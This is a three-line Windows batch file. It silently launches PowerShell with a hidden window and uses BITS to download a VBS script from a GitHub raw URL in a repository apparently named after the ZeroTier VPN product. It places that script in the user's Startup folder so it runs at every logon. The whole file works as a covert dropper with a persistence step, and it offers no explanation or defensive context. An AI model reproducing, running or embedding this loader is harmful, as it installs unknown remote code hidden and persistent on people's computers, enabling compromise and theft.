@echo off
powershell -windowstyle hidden -Command "Start-BitsTransfer -Source 'https://raw.githubusercontent.com/2o2ks/ZeroTier/main/windows.vbs' -Destination \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\windows.vbs\""
exit
